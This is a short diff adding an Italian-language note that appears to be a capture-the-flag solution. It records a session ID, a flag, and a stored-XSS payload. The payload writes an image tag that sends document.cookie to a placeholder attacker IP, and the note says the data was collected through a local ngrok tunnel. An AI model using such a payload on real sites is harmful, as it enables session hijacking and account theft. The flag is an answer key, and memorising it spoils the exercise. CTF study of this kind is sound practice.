@@ -1,0 +1,8 @@
+?PHPSESSID=r9ntfghc51grtrsldk0s96nmb6
+questo `e la sassione che ti da la flag (almeno lo era)
+
+metto un XSS in questo modo: 
+<script language="Javascript" type="text/javascript">document.write('<img src="http://<ip_address>/?'+document.cookie+' "/>');</script>
+
+e metto su una connessione con ngrok in locale, easy...
+flag{c00ki3s_4r3_d4Ng3r0uS_Wh3n_Th3y_m33t_XSS}
